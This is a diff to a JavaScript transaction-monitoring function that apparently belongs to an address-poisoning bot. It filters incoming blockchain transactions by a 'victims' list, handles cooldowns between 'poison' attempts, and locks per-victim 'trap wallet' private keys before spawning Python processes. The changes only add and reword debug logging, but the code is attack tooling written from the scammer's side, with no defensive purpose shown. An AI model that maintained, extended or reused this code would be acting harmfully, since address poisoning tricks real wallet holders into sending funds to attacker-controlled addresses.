@@ -1004,7 +1004,10 @@ function checkTransaction(tx, txLogs = []) {
 
 
   // Deduplicate
-  if (processedTxHashes.has(hash)) return;
+  if (processedTxHashes.has(hash)) {
+    logger.debug(`[DEBUG] Transaction ${hash} already processed, skipping`);
+    return;
+  }
   processedTxHashes.set(hash, now);
 
   if (processedTxHashes.size > 50000) {
@@ -1088,12 +1091,15 @@ function checkTransaction(tx, txLogs = []) {
 
   // Caught victim exclusion
   if (caughtVictims.has(from)) {
-    logger.debug(`[skip] ${from} is a caught victim, removing from active map`);
+    logger.info(`[DEBUG] ⏭️ ${from} is a caught victim, removing from active map`);
     victims.delete(from);
     return;
   }
 
-  if (!victims.has(from)) return;
+  if (!victims.has(from)) {
+    logger.debug(`[DEBUG] ${from} is not in our victims list, skipping`);
+    return;
+  }
 
   const entry = victims.get(from);
 
@@ -1117,7 +1123,7 @@ function checkTransaction(tx, txLogs = []) {
 
   // Counterparty wildcard check using actual recipient
   if (entry.counterparty && actualRecipient !== entry.counterparty) {
-    logger.debug(`[skip] ${from} sent to ${actualRecipient} but counterparty is ${entry.counterparty}`);
+    logger.info(`[DEBUG] ⏭️ ${from} sent to ${actualRecipient} but counterparty is ${entry.counterparty} - NOT a target transaction`);
     return;
   }
 
@@ -1135,13 +1141,14 @@ function checkTransaction(tx, txLogs = []) {
 
   const dynamicCooldown = getDynamicCooldown(from);
   if (now - entry.lastPoison < dynamicCooldown) {
-    logger.debug(`[skip] ${from} on cooldown (${Math.round((dynamicCooldown - (now - entry.lastPoison)) / 1000)}s remaining)`);
+    const remaining = Math.round((dynamicCooldown - (now - entry.lastPoison)) / 1000);
+    logger.info(`[DEBUG] ⏭️ ${from} on cooldown (${remaining}s remaining, need ${Math.round(dynamicCooldown / 1000)}s)`);
     return;
   }
 
   // 🚀 PREVENT CONCURRENT PYTHON SPAWNS
   if (trapLocks.get(entry.privateKey)) {
-    logger.debug(`[skip] Trap wallet for victim ${from} is currently busy. Skipping.`);
+    logger.info(`[DEBUG] ⏭️ Trap wallet for victim ${from} is currently busy. Skipping.`);
     return;
   }
   trapLocks.set(entry.privateKey, true);
